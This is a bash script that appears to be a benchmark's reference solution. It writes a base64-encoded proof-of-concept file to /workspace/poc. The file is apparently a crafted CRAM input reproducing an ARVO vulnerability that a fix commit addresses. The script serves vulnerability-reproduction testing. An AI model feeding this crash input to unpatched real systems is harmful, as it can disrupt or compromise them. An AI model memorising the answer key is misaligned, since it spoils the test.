#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit a01a139a addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
Q1JBTQIBAAAAAAA8aQBTU7VTU1OtqAD/BEBTUQn///////8AAAD/a2NGbGVmbwYFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUF4QUFBQUFBQUFBb0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFJgEC4OgFgCkABgBmaWxlZm8JBQIox83ISUNOz89JRFg9MjFJTkZWQ1EJLy86
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
